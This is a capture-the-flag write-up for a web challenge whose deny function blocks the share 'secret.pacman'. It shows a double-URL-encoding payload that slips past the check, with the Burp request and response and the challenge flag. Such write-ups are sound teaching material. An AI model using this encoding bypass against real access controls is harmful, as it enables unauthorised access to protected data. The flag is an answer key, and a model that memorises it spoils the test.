# No share - Level 1
## Introduction
Our enemies hosted a file sharing system which on surface exposes content for gaming enthusiasts. However in reality, a private share contains cracked games, destructive universal exploits and forbidden binaries. Jeanne requests your talents to uncover the secrets behind this share.

A knight of the order already succeeded to exfiltrate the `deny` function in use, this is your turn now to act. Finish the work, complete the mission.

```python
def deny(share):
    return 'secret.pacman' in share.lower()
```

## Challenge Resolution
### Understanding the app
At the first request to the file system, we can see that the server must get the files via a `TCP/IP` transfer, such as un `HTTP` `GET` request, because the share are described by **hostname**/**IP**:
```http
HTTP/1.1 200 OK
Content-Length: 89
Content-Type: application/json
Date: Fri, 30 Jan 2026 16:32:02 GMT
Server: gunicorn

[{"host":"public.pacman","ip":"172.45.16.23"},{"host":"secret.pacman","ip":"127.0.0.1"}]
```
If the server actually sends another `HTTP` request after validating the input with the deny function, maybe it is possible to bypass the validation using double encoding.
### Double Encoding
Here we double encode the point `.` (`%2e`). When the `deny` function is applied to this entry, it will have only been decoded **once**, so the input for `deny` will be `secret%2epacman`and it will be validated. However, as this string will be used in another request, it will be decoded a **second time** as `secret.pacman`.
#### Burp Repeater
```http
GET /api/folder?path=%2F&share=secret%25%32%65pacman HTTP/1.1
Host: noshare1.web02.jeanne-hack-ctf.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.9,en-US;q=0.8,en;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: http://noshare1.web02.jeanne-hack-ctf.org/
Connection: keep-alive
X-PwnFox-Color: pink
Priority: u=0
```
#### Response
```http
HTTP/1.1 200 OK
Content-Length: 37
Content-Type: application/json
Date: Fri, 30 Jan 2026 12:40:15 GMT
Server: gunicorn

[{"name":"Secrets","type":"folder"}]
```
It works! We can then **match and replace** `secret.pacman` for `secret%25%32%65pacman` and navigate through the file system to catch the flag: 
```flag
JDHACK{n0_sh4r3_4cc3ss_byp4ss3d}
```

